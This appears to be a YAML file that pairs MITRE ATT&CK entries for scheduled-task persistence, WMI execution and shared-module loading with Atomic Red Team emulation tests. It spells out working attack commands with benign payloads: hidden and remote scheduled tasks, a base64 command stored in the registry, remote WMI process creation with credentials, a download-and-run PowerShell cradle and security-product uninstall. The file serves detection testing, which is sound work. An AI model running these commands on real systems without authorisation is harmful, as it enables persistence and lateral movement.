execution:
  T1053.005:
    technique:
      modified: '2023-04-07T17:11:17.807Z'
      name: 'Scheduled Task/Job: Scheduled Task'
      description: "Adversaries may abuse the Windows Task Scheduler to perform task
        scheduling for initial or recurring execution of malicious code. There are
        multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
        utility can be run directly on the command line, or the Task Scheduler can
        be opened through the GUI within the Administrator Tools section of the Control
        Panel. In some cases, adversaries have used a .NET wrapper for the Windows
        Task Scheduler, and alternatively, adversaries have used the Windows netapi32
        library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110)
        utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)),
        though <code>at.exe</code> can not access tasks created with <code>schtasks</code>
        or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute
        programs at system startup or on a scheduled basis for persistence. The Windows
        Task Scheduler can also be abused to conduct remote Execution as part of Lateral
        Movement and/or to run a process under the context of a specified account
        (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
        adversaries have also abused the Windows Task Scheduler to potentially mask
        one-time execution under signed/trusted system processes.(Citation: ProofPoint
        Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide
        Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible
        to defender tools and manual queries used to enumerate tasks. Specifically,
        an adversary may hide a task from `schtasks /query` and the Task Scheduler
        by deleting the associated Security Descriptor (SD) registry value (where
        deletion of this value must be completed using SYSTEM permissions).(Citation:
        SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
        methods to hide tasks, such as altering the metadata (e.g., `Index` value)
        within associated registry keys.(Citation: Defending Against Scheduled Task
        Attacks in Windows Environments) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_contributors:
      - Andrew Northern, @ex_raritas
      - Bryan Campbell, @bry_campbell
      - Zachary Abzug, @ZackDoesML
      - Selena Larson, @selenalarson
      - Sittikorn Sangrattanapitak
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

        * Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
        * Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
        * Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
        * Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
        * Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
        * Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)

        Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'File: File Modification'
      - 'Scheduled Job: Scheduled Job Creation'
      - 'Windows Registry: Windows Registry Key Creation'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - Administrator
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9
      created: '2019-11-27T14:58:00.429Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1053/005
        external_id: T1053.005
      - source_name: SigmaHQ
        description: BlackB0lt. (2022, April 15). https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_removal_sd_value_scheduled_task_hide.yml.
          Retrieved June 1, 2022.
        url: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_removal_sd_value_scheduled_task_hide.yml
      - source_name: ProofPoint Serpent
        description: Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New
          Backdoor Targets French Entities with Unique Attack Chain. Retrieved April
          11, 2022.
        url: https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain
      - source_name: Defending Against Scheduled Task Attacks in Windows Environments
        description: Harshal Tupsamudre. (2022, June 20). Defending Against Scheduled
          Tasks. Retrieved July 5, 2022.
        url: https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments
      - source_name: Twitter Leoloobeek Scheduled Task
        description: Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved
          December 12, 2017.
        url: https://twitter.com/leoloobeek/status/939248813465853953
      - source_name: Tarrask scheduled task
        description: Microsoft Threat Intelligence Team & Detection and Response Team
          . (2022, April 12). Tarrask malware uses scheduled tasks for defense evasion.
          Retrieved June 1, 2022.
        url: https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
      - source_name: Microsoft Scheduled Task Events Win10
        description: Microsoft. (2017, May 28). Audit Other Object Access Events.
          Retrieved June 27, 2019.
        url: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events
      - source_name: TechNet Scheduled Task Events
        description: Microsoft. (n.d.). General Task Registration. Retrieved December
          12, 2017.
        url: https://technet.microsoft.com/library/dd315590.aspx
      - source_name: TechNet Autoruns
        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
          Retrieved June 6, 2016.
        url: https://technet.microsoft.com/en-us/sysinternals/bb963902
      - source_name: TechNet Forum Scheduled Task Operational Setting
        description: Satyajit321. (2015, November 3). Scheduled Tasks History Retention
          settings. Retrieved December 12, 2017.
        url: https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1053.005
    atomic_tests:
    - name: Scheduled Task Startup Script
      auto_generated_guid: fec27f65-db86-4c2d-b66c-61945aee87c2
      description: |
        Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
        the tasks, open the Task Scheduler and look in the Active Tasks pane.
      supported_platforms:
      - windows
      executor:
        command: |
          schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
          schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
        cleanup_command: |
          schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1
          schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
        name: command_prompt
        elevation_required: true
    - name: Scheduled task Local
      auto_generated_guid: 42f53695-ad4a-4546-abb6-7d837f644a71
      description: 'Upon successful execution, cmd.exe will create a scheduled task
        to spawn cmd.exe at 20:10.

        '
      supported_platforms:
      - windows
      input_arguments:
        task_command:
          description: What you want to execute
          type: string
          default: C:\windows\system32\cmd.exe
        time:
          description: What time 24 Hour
          type: string
          default: '20:10'
      executor:
        name: command_prompt
        elevation_required: false
        command: 'SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}

          '
        cleanup_command: 'SCHTASKS /Delete /TN spawn /F >nul 2>&1

          '
    - name: Scheduled task Remote
      auto_generated_guid: 2e5eac3e-327b-4a88-a0c0-c4057039a8dd
      description: |
        Create a task on a remote system.
        Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.
      supported_platforms:
      - windows
      input_arguments:
        task_command:
          description: What you want to execute
          type: string
          default: C:\windows\system32\cmd.exe
        time:
          description: What time 24 Hour
          type: string
          default: '20:10'
        target:
          description: Target
          type: string
          default: localhost
        user_name:
          description: 'Username to authenticate with, format: DOMAIN\User'
          type: string
          default: DOMAIN\user
        password:
          description: Password to authenticate with
          type: string
          default: At0micStrong
      executor:
        name: command_prompt
        elevation_required: true
        command: 'SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN
          "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}

          '
        cleanup_command: 'SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password}
          /TN "Atomic task" /F >nul 2>&1

          '
    - name: Powershell Cmdlet Scheduled Task
      auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
      description: |
        Create an atomic scheduled task that leverages native powershell cmdlets.

        Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: |
          $Action = New-ScheduledTaskAction -Execute "calc.exe"
          $Trigger = New-ScheduledTaskTrigger -AtLogon
          $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
          $Set = New-ScheduledTaskSettingsSet
          $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
          Register-ScheduledTask AtomicTask -InputObject $object
        cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
          >$null 2>&1

          '
    - name: Task Scheduler via VBA
      auto_generated_guid: ecd3fa21-7792-41a2-8726-2c5c673414d3
      description: |
        This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
        30 - 40 seconds after this module has run
      supported_platforms:
      - windows
      input_arguments:
        ms_product:
          description: Maldoc application Word
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"
          -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
          -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
        name: powershell
        cleanup_command: 'Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false

          '
    - name: WMI Invoke-CimMethod Scheduled Task
      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
      description: 'Create an scheduled task that executes notepad.exe after user
        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
        as Register-ScheduledTask cmdlet behind the scenes.

        '
      supported_platforms:
      - windows
      input_arguments:
        xml_path:
          description: path of vbs to use when creating masquerading files
          type: path
          default: PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml
      dependency_executor_name: powershell
      dependencies:
      - description: 'File to copy must exist on disk at specified location (#{xml_path})

          '
        prereq_command: 'if (Test-Path #{xml_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{xml_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml" -OutFile "#{xml_path}"
      executor:
        name: powershell
        elevation_required: true
        command: |
          $xml = [System.IO.File]::ReadAllText("#{xml_path}")
          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
          >$null 2>&1

          '
    - name: Scheduled Task Executing Base64 Encoded Commands From Registry
      auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba
      description: "A Base64 Encoded command will be stored in the registry (ping
        127.0.0.1) and then a scheduled task will be created.\nThe scheduled task
        will launch powershell to decode and run the command in the registry daily.\nThis
        is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona
        Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n"
      supported_platforms:
      - windows
      input_arguments:
        time:
          description: Daily scheduled task execution time
          type: string
          default: '07:45'
      executor:
        command: |
          reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
          schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
        cleanup_command: |
          schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
          reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
        name: command_prompt
    - name: Import XML Schedule Task with Hidden Attribute
      auto_generated_guid: cd925593-fbb4-486d-8def-16cbdf944bf4
      description: "Create an scheduled task that executes calc.exe after user login
        from XML that contains hidden setting attribute. \nThis technique was seen
        several times in tricbot malware and also with the targetted attack campaigne
        the industroyer2.\n"
      supported_platforms:
      - windows
      input_arguments:
        xml_path:
          description: path of vbs to use when creating masquerading files
          type: path
          default: PathToAtomicsFolder\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml
      dependency_executor_name: powershell
      dependencies:
      - description: 'File to copy must exist on disk at specified location (#{xml_path})

          '
        prereq_command: 'if (Test-Path #{xml_path}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{xml_path}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml" -OutFile "#{xml_path}"
      executor:
        name: powershell
        elevation_required: true
        command: |
          $xml = [System.IO.File]::ReadAllText("#{xml_path}")
          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
        cleanup_command: 'Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false
          >$null 2>&1

          '
    - name: PowerShell Modify A Scheduled Task
      auto_generated_guid: dda6fc7b-c9a6-4c18-b98d-95ec6542af6d
      description: "Create a scheduled task with an action and modify the action to
        do something else. The initial idea is to showcase Microsoft Windows TaskScheduler
        Operational log modification of an action on a Task already registered. \nIt
        will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon
        successful execution, powershell.exe will create a scheduled task and modify
        the action. \n"
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: |
          $Action = New-ScheduledTaskAction -Execute "cmd.exe"
          $Trigger = New-ScheduledTaskTrigger -AtLogon
          $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
          $Set = New-ScheduledTaskSettingsSet
          $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
          Register-ScheduledTask AtomicTaskModifed -InputObject $object
          $NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
          Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
        cleanup_command: 'Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false
          >$null 2>&1

          '
  T1047:
    technique:
      modified: '2023-04-07T17:10:13.696Z'
      name: Windows Management Instrumentation
      description: |-
        Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)

        An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - "@ionstorm"
      x_mitre_deprecated: false
      x_mitre_detection: 'Monitor network traffic for WMI connections; the use of
        WMI in environments that do not typically use WMI may be suspect. Perform
        process monitoring to capture command-line arguments of "wmic" and detect
        commands that are used to perform remote behavior. (Citation: FireEye WMI
        2015)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Network Traffic: Network Connection Creation'
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
      created: '2017-05-31T21:30:44.329Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1047
        external_id: T1047
      - source_name: FireEye WMI 2015
        description: Ballenthin, W., et al. (2015). Windows Management Instrumentation
          (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.
        url: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
      - source_name: FireEye WMI SANS 2015
        description: Devon Kerr. (2015). There's Something About WMI. Retrieved May
          4, 2020.
        url: https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf
      - source_name: MSDN WMI
        description: Microsoft. (n.d.). Windows Management Instrumentation. Retrieved
          April 27, 2016.
        url: https://msdn.microsoft.com/en-us/library/aa394582.aspx
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1047
    atomic_tests:
    - name: WMI Reconnaissance Users
      auto_generated_guid: c107778c-dcf5-47c5-af2e-1d058a3df3ea
      description: "An adversary might use WMI to list all local User Accounts. \nWhen
        the test completes , there should be local user accounts information displayed
        on the command line.\n"
      supported_platforms:
      - windows
      executor:
        command: 'wmic useraccount get /ALL /format:csv

          '
        name: command_prompt
    - name: WMI Reconnaissance Processes
      auto_generated_guid: 5750aa16-0e59-4410-8b9a-8a47ca2788e2
      description: |
        An adversary might use WMI to list Processes running on the compromised host.
        When the test completes , there should be running processes listed on the command line.
      supported_platforms:
      - windows
      executor:
        command: 'wmic process get caption,executablepath,commandline /format:csv

          '
        name: command_prompt
    - name: WMI Reconnaissance Software
      auto_generated_guid: 718aebaa-d0e0-471a-8241-c5afa69c7414
      description: |
        An adversary might use WMI to list installed Software hotfix and patches.
        When the test completes, there should be a list of installed patches and when they were installed.
      supported_platforms:
      - windows
      executor:
        command: 'wmic qfe get description,installedOn /format:csv

          '
        name: command_prompt
    - name: WMI Reconnaissance List Remote Services
      auto_generated_guid: 0fd48ef7-d890-4e93-a533-f7dedd5191d3
      description: "An adversary might use WMI to check if a certain Remote Service
        is running on a remote device. \nWhen the test completes, a service information
        will be displayed on the screen if it exists.\nA common feedback message is
        that \"No instance(s) Available\" if the service queried is not running.\nA
        common error message is \"Node - (provided IP or default)  ERROR Description
        =The RPC server is unavailable\" \nif the provided remote host is unreachable\n"
      supported_platforms:
      - windows
      input_arguments:
        node:
          description: Ip Address
          type: string
          default: 127.0.0.1
        service_search_string:
          description: Name Of Service
          type: string
          default: Spooler
      executor:
        command: 'wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")

          '
        name: command_prompt
    - name: WMI Execute Local Process
      auto_generated_guid: b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3
      description: |
        This test uses wmic.exe to execute a process on the local host.
        When the test completes , a new process will be started locally .A notepad application will be started when input is left on default.
      supported_platforms:
      - windows
      input_arguments:
        process_to_execute:
          description: Name or path of process to execute.
          type: string
          default: notepad.exe
      executor:
        command: 'wmic process call create #{process_to_execute}

          '
        cleanup_command: 'wmic process where name=''#{process_to_execute}'' delete
          >nul 2>&1

          '
        name: command_prompt
    - name: WMI Execute Remote Process
      auto_generated_guid: 9c8ef159-c666-472f-9874-90c8d60d136b
      description: |
        This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.
        To clean up, provide the same node input as the one provided to run the test
        A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" if the default or provided IP is unreachable
      supported_platforms:
      - windows
      input_arguments:
        node:
          description: Ip Address
          type: string
          default: 127.0.0.1
        user_name:
          description: Username
          type: string
          default: DOMAIN\Administrator
        password:
          description: Password
          type: string
          default: P@ssw0rd1
        process_to_execute:
          description: Name or path of process to execute.
          type: string
          default: notepad.exe
      executor:
        command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}" process
          call create #{process_to_execute}

          '
        cleanup_command: 'wmic /user:#{user_name} /password:#{password} /node:"#{node}"
          process where name=''#{process_to_execute}'' delete >nul 2>&1

          '
        name: command_prompt
    - name: Create a Process using WMI Query and an Encoded Command
      auto_generated_guid: 7db7a7f9-9531-4840-9b30-46220135441c
      description: |
        Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
         Powershell -nop -exec bypass -EncodedCommand <encoded command>
        Where the –EncodedCommand, once decoded, would resemble:
          Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
        The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
        You should expect to see notepad.exe running after execution of this test.
        [Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
      supported_platforms:
      - windows
      executor:
        command: 'powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA

          '
        name: command_prompt
    - name: Create a Process using obfuscated Win32_Process
      auto_generated_guid: 10447c83-fc38-462a-a936-5102363b1c43
      description: |
        This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.
        [Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)
      supported_platforms:
      - windows
      input_arguments:
        new_class:
          description: Derived class name
          type: string
          default: Win32_Atomic
        process_to_execute:
          description: Name or path of process to execute.
          type: string
          default: notepad.exe
      executor:
        name: powershell
        elevation_required: true
        command: |
          $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
          $NewClass = $Class.Derive("#{new_class}")
          $NewClass.Put()
          Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
        cleanup_command: |
          $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("#{new_class}"))
          try { $CleanupClass.Delete() } catch {}
    - name: WMI Execute rundll32
      auto_generated_guid: '00738d2a-4651-4d76-adf2-c43a41dfb243'
      description: 'This test uses wmic.exe to execute a DLL function using rundll32.
        Specify a valid value for remote IP using the node parameter.

        '
      supported_platforms:
      - windows
      input_arguments:
        node:
          description: Ip Address
          type: string
          default: 127.0.0.1
        dll_to_execute:
          description: Path to DLL.
          type: string
          default: "$env:TEMP\\calc.dll"
        function_to_execute:
          description: Name of DLL function to call
          type: string
          default: StartW
      dependency_executor_name: powershell
      dependencies:
      - description: DLL with function to execute must exist on disk at specified
          location (#{dll_to_execute})
        prereq_command: 'if (Test-Path #{dll_to_execute}) {exit 0} else {exit 1}'
        get_prereq_command: 'Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true"
          -OutFile "#{dll_to_execute}"

          '
      executor:
        command: 'wmic /node:#{node} process call create "rundll32.exe #{dll_to_execute}
          #{function_to_execute}"

          '
        cleanup_command: taskkill /f /im calculator.exe
        name: powershell
    - name: Application uninstall using WMIC
      auto_generated_guid: c510d25b-1667-467d-8331-a56d3e9bc4ff
      description: Emulates uninstalling  applications using WMIC.  This method only
        works if the product was installed with an msi file.  APTs have been seen
        using this to uninstall security products.
      supported_platforms:
      - windows
      input_arguments:
        node:
          description: Computer the action is being executed against but defaults
            to the localhost.
          type: string
          default: 127.0.0.1
        product:
          description: Enter the product name being uninstalled.  This will default
            to TightVNC.
          type: string
          default: Tightvnc
      dependency_executor_name: powershell
      dependencies:
      - description: TightVNC must be installed.
        prereq_command: if ((Test-Path "C:\Program Files\TightVNC\tvnviewer.exe")-Or
          (Test-Path "C:\Program Files (x86)\TightVNC\tvnviewer.exe")) {exit 0} else
          {exit 1}
        get_prereq_command: |-
          Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi
          start-sleep -s 10
          msiexec /i PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi /qn /norestart
          start-sleep -s 15
      executor:
        command: wmic /node:"#{node}" product where "name like '#{product}%%'" call
          uninstall
        cleanup_command: msiexec /i PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi
          /qn /norestart
        name: command_prompt
        elevation_required: true
  T1129:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Stefan Kanthak
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65
      created: '2017-05-31T21:31:40.542Z'
      x_mitre_version: '2.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1129
        url: https://attack.mitre.org/techniques/T1129
      - source_name: Wikipedia Windows Library Files
        url: https://en.wikipedia.org/wiki/Microsoft_Windows_library_files
        description: Wikipedia. (2017, January 31). Microsoft Windows library files.
          Retrieved February 13, 2017.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may execute malicious payloads via loading shared
        modules. The Windows module loader can be instructed to load DLLs from arbitrary
        local paths and arbitrary Universal Naming Convention (UNC) network paths.
        This functionality resides in NTDLL.dll and is part of the Windows [Native
        API](https://attack.mitre.org/techniques/T1106) which is called from functions
        like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32
        API.(Citation: Wikipedia Windows Library Files)\n\nThe module loader can load
        DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname
        in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified
        with (fully-qualified or relative) pathname (but without extension);\n    \n*
        via an NTFS junction or symlink program.exe.local with the fully-qualified
        or relative pathname of a directory containing the DLLs specified in the IMPORT
        directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\"
        loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded
        or external \"application manifest\". The file name refers to an entry in
        the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality
        as a way to execute arbitrary payloads on a victim system. For example, malware
        may execute share modules to load additional components or features."
      modified: '2022-04-19T20:31:10.657Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Shared Modules
      x_mitre_detection: "Monitoring DLL module loads may generate a significant amount
        of data and may not be directly useful for defense unless collected under
        specific circumstances, since benign use of Windows modules load functions
        are common and may be difficult to distinguish from malicious behavior. Legitimate
        software will likely only need to load routine, bundled DLL modules or Windows
        system DLLs such that deviation from known module loads may be suspicious.
        Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code>
        directories will protect against module loads from unsafe paths. \n\nCorrelation
        of other events with behavior surrounding module loads using API monitoring
        and suspicious DLLs written to disk will provide additional context to an
        event that may assist in determining if it is due to malicious behavior."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Module: Module Load'
      - 'Process: OS API Execution'
      x_mitre_remote_support: false
